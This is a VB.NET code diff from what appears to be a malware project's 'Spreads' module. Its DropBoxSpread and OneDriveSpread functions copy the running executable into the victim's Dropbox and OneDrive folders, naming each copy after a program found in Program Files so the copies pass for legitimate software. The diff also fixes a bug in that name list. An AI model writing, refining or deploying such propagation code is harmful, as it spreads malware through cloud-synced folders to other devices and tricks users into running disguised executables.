@@ -19,9 +19,6 @@ Namespace Spreads
         Private Function DropBoxSpread()
             If (Directory.Exists(DropboxFolder) = True) Then
                 For Each fname As String In ProgramList()
-                    If File.Exists(Path.Combine(DropboxFolder, fname & ".exe")) Then
-                        IO.File.Delete(Path.Combine(DropboxFolder, fname & ".exe"))
-                    End If
                     File.Copy(Application.ExecutablePath, Path.Combine(DropboxFolder, fname & ".exe"), True)
                 Next
                 Return True
@@ -32,9 +29,6 @@ Namespace Spreads
         Private Function OneDriveSpread()
             If (Directory.Exists(OneDriveFolder) = True) Then
                 For Each fname As String In ProgramList()
-                    If File.Exists(Path.Combine(OneDriveFolder, fname & ".exe")) Then
-                        IO.File.Delete(Path.Combine(OneDriveFolder, fname & ".exe"))
-                    End If
                     File.Copy(Application.ExecutablePath, Path.Combine(OneDriveFolder, fname & ".exe"), True)
                 Next
                 Return True
@@ -46,7 +40,7 @@ Namespace Spreads
                 Dim NameList As New List(Of String)
                 Dim folderPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)
                 For Each text As String In Directory.GetDirectories(folderPath)
-                    Dim text2 As String = text.Substring(text.LastIndexOf("\")).Replace("\", String.Empty) & vbCrLf
+                    Dim text2 As String = text.Substring(text.LastIndexOf("\")).Replace("\", String.Empty)
                     NameList.Add(text2)
                 Next
                 Return NameList
